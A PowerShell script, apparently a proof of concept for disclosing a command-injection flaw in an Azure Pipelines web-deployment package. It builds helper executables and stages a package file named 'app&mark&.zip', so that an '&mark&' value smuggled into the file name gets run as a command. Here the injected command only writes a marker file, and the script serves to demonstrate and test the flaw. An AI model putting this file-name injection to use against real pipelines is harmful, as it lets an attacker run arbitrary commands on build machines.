# Windows-only. Builds the two helper executables, installs the two published packages,
# creates the payload package file on disk, and runs the detonation with its two controls.
# The injected command is mark.exe, which writes one marker file and does nothing else.
# Run: powershell -NoProfile -File detonate.ps1
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path ([System.IO.Path]::GetTempPath()) ("msdeploy-poc-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path (Join-Path $work 'repo') | Out-Null
$csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
& $csc /nologo /out:"$work\msdeploy.exe" (Join-Path $here 'argvdump.cs')
& $csc /nologo /out:"$work\mark.exe"     (Join-Path $here 'mark.cs')
$env:PATH = "$work;$env:PATH"
$payload = Join-Path $work 'repo\app&mark&.zip'
Set-Content -LiteralPath $payload -Value 'inert'
Push-Location $here
if (-not (Test-Path (Join-Path $here 'node_modules'))) { npm init -y | Out-Null; npm i azure-pipelines-tasks-webdeployment-common@4.281.0 azure-pipelines-task-lib@5.280.3 | Out-Null }
$env:POC_MARKER_ID = 'msdeploy-poc'
node (Join-Path $here 'detonate.js') $work $payload
Pop-Location
Write-Host ("work dir: " + $work)
